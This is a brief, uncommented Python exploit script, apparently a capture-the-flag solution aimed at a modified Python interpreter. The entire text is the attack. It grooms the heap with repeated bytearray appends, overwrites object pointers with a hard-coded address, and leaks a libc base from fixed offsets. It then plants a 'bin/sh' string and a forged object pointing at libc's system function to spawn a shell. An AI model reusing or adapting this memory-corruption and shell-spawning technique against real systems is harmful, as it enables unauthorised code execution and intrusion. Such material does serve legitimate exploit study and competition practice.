a = []
for i in range(8):
    system_append(a, bytearray(8))

b = bytearray(b'a' * 56)
for i in range(25):
    my_append(a, bytearray(8))

my_append(a, bytearray)
my_append(a, bytearray(8))
my_append(a, bytearray(8))

helper = bytearray(b'b' * 56)
my_append(a, helper)
my_append(a, helper)

target = to_little_endian_bytes(0x948070)
for i in range(8):
    b[32 + i] = target[i]

for i in range(8):
    b[40 + i] = target[i]

libc_base = from_little_endian_bytes(bytes(helper[:8])) - 560320

target = b'-bin/sh\x00'[::-1]

for i in range(8):
    b[7 - i] = target[i]

system = b'a' * 56 + to_little_endian_bytes(libc_base + 312464) + b'\x00' * 48
target = to_little_endian_bytes(id(system))

for i in range(8):
    b[8+i] = target[i]

print(helper)
